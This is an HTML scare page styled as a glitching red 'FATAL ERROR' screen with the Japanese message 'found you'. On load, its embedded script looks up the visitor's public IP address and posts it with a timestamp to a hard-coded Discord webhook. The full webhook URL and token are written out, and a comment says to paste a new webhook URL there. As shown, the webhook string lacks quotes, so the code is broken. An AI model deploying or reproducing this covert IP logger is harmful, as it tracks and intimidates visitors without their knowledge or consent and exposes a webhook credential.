<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>FATAL ERROR // UNKNOWN SYSTEM</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #000;
      color: #ff0000;
      font-family: 'Courier New', Courier, monospace;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      user-select: none;
    }

    .flicker {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(100, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.95) 80%);
      pointer-events: none;
      animation: noise-flicker 0.15s infinite;
    }

    .scanlines {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        to bottom,
        rgba(255,255,255,0),
        rgba(255,255,255,0) 50%,
        rgba(0, 0, 0, 0.8) 50%,
        rgba(0, 0, 0, 0.8)
      );
      background-size: 100% 4px;
      pointer-events: none;
    }

    .horror-title {
      font-size: 2.8rem;
      font-weight: 900;
      letter-spacing: 5px;
      color: #cc0000;
      text-shadow: 0 0 20px #ff0000, 3px 3px 0px #000;
      animation: horror-glitch 0.2s infinite;
      margin-bottom: 20px;
      text-align: center;
    }

    .horror-sub {
      font-size: 1.2rem;
      color: #880000;
      text-shadow: 0 0 8px #ff0000;
      animation: pulse 1.5s infinite alternate;
      text-align: center;
      letter-spacing: 2px;
    }

    @keyframes noise-flicker {
      0% { opacity: 0.8; }
      50% { opacity: 1; }
      100% { opacity: 0.85; }
    }

    @keyframes horror-glitch {
      0% { transform: translate(0, 0); text-shadow: 2px 0 0 #ff0000, -2px 0 0 #550000; }
      25% { transform: translate(-3px, 2px); text-shadow: -2px 0 0 #ff0000, 2px 0 0 #550000; }
      50% { transform: translate(2px, -1px); text-shadow: 3px 0 0 #880000, -3px 0 0 #000; }
      75% { transform: translate(-1px, -2px); text-shadow: -1px 0 0 #ff0000, 1px 0 0 #550000; }
      100% { transform: translate(0, 0); text-shadow: 2px 0 0 #ff0000, -2px 0 0 #550000; }
    }

    @keyframes pulse {
      0% { opacity: 0.2; transform: scale(0.98); }
      100% { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>

  <div class="flicker"></div>
  <div class="scanlines"></div>

  <div class="horror-title">見 つ け た</div>
  <div class="horror-sub">LOCATING TARGET... [IP_CAPTURED]</div>

  <script>
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        // ★↓ ここに新しいDiscordのWebhook URLを貼り付けます ↓★
        const webhookUrl = https://discord.com/api/webhooks/1539154953397075970/CkOmW2zOMnalDSwSei6nktiz2Wvq6-l-VnGzSlmgDwHjpRUFNIFL0yQdi9xQAfaW8Bc8;
        
        const payload = {
          content: `🚨 **アクセス通知**\nIPアドレス: \`${data.ip}\`\n日時: ${new Date().toLocaleString('ja-JP')}`
        };

        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .catch(err => console.error(err));
  </script>

</body>
</html>
